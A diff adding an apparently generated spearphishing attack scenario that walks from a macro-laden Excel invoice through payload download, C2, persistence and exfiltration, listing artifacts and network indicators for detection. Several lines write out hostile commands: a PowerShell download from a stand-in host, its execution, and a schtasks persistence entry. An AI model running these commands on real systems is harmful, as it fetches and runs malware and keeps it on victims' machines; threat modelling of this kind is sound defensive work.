@@ -1,0 +1,71 @@
+<output>
+Pattern Name: Spearphishing Attachment
+
+Scenario Overview: This attack scenario involves an attacker sending a spearphishing email with a malicious attachment. The user opens the attachment, which exploits a vulnerability in Microsoft Excel to execute a payload. The payload then communicates with a command and control (C2) server to download additional malicious components, leading to further exploitation of the system.
+
+Attack Flow Breakdown:
+
+1. **Initial Access via Email**
+   - **Application Involved**: Outlook
+   - **User Action**: The user receives an email with a subject line "Invoice Attached" and opens the email.
+   - **Key Artifacts**: Email headers, attachment filename (e.g., "Invoice_12345.xls").
+   - **Network Indicators**: Email server logs showing the delivery of the spearphishing email.
+
+2. **Opening the Malicious Attachment**
+   - **Application Involved**: Microsoft Excel
+   - **User Action**: The user double-clicks the attachment to open it.
+   - **Key Artifacts**: Excel file (e.g., "Invoice_12345.xls") containing embedded macros.
+   - **Network Indicators**: Excel process creation logs.
+
+3. **Macro Execution**
+   - **Application Involved**: Microsoft Excel
+   - **User Action**: The user enables macros when prompted by Excel.
+   - **Key Artifacts**: VBA code execution logs, macro settings in Excel.
+   - **Network Indicators**: Outbound connections initiated by Excel to a malicious URL (e.g., `http://malicious-domain.com/payload`).
+
+4. **Payload Download and Execution**
+   - **Application Involved**: PowerShell
+   - **User Action**: The macro executes a PowerShell command to download a malicious executable.
+   - **Key Artifacts**: PowerShell command history, downloaded file (e.g., "malware.exe").
+   - **Network Indicators**: PowerShell logs showing the execution of `Invoke-WebRequest` or `curl` commands.
+
+   ```shell
+   # PowerShell command to download the payload
+   Invoke-WebRequest -Uri "http://malicious-domain.com/payload" -OutFile "C:\Users\Victim\Downloads\malware.exe"
+   ```
+
+5. **Execution of the Malicious Payload**
+   - **Application Involved**: Windows Explorer
+   - **User Action**: The downloaded executable is automatically executed by the macro.
+   - **Key Artifacts**: Process creation logs for "malware.exe".
+   - **Network Indicators**: Outbound connections to the C2 server (e.g., `http://c2-server.com`).
+
+   ```shell
+   # Command to execute the downloaded malware
+   Start-Process "C:\Users\Victim\Downloads\malware.exe"
+   ```
+
+6. **Establishing Command and Control**
+   - **Application Involved**: Malware (custom executable)
+   - **User Action**: The malware connects to the C2 server to receive further instructions.
+   - **Key Artifacts**: Network traffic logs showing connections to the C2 server.
+   - **Network Indicators**: DNS queries and HTTP requests to the C2 server.
+
+7. **Persistence Mechanism**
+   - **Application Involved**: Windows Task Scheduler
+   - **User Action**: The malware creates a scheduled task to ensure it runs on system startup.
+   - **Key Artifacts**: Scheduled task entries in Windows Task Scheduler.
+   - **Network Indicators**: Logs showing the creation of a new task (e.g., "malware_task").
+
+   ```shell
+   # Command to create a scheduled task for persistence
+   schtasks /create /tn "malware_task" /tr "C:\Users\Victim\Downloads\malware.exe" /sc onlogon
+   ```
+
+8. **Data Exfiltration**
+   - **Application Involved**: Malware
+   - **User Action**: The malware collects sensitive data and sends it back to the C2 server.
+   - **Key Artifacts**: Logs of files accessed and data sent.
+   - **Network Indicators**: Outbound traffic to the C2 server containing exfiltrated data.
+
+</output>
